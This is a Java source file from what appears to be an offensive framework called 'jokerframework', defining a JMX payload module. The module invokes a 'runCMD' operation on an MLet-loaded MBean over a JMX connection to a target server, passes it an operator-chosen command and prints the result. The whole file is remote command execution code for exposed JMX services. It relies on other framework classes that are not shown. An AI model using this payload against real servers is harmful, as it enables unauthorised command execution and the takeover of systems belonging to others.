package com.lucifaer.jokerframework.modules.payloads.jmx;

import com.lucifaer.jokerframework.data.ExploitDataModel.JmxDataModel;
import com.lucifaer.jokerframework.modules.Payload;
import com.lucifaer.jokerframework.server.jmx.JmxClient;

import static com.lucifaer.jokerframework.utils.OutPut.echo;

public class JmxCommand implements Payload {
    private JmxClient jmxClient;
    @Override
    public void exec() {
        try {
            exploit();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void init(Object object) {
        this.jmxClient = (JmxClient) object;
    }

    private void exploit() throws Exception {
        echo("[INFO] Loading " + JmxDataModel.mletBean.getClassName());
        echo("[INFO] Executing command: " + JmxDataModel.command);
        String[] mletParams = {JmxDataModel.command};
        String[] mletSigneture = {"java.lang.String"};
        String reader = (String) this.jmxClient.getMbsc().invoke(JmxDataModel.mletBean.getObjectName(), "runCMD", mletParams, mletSigneture);
        echo(reader);
    }
}
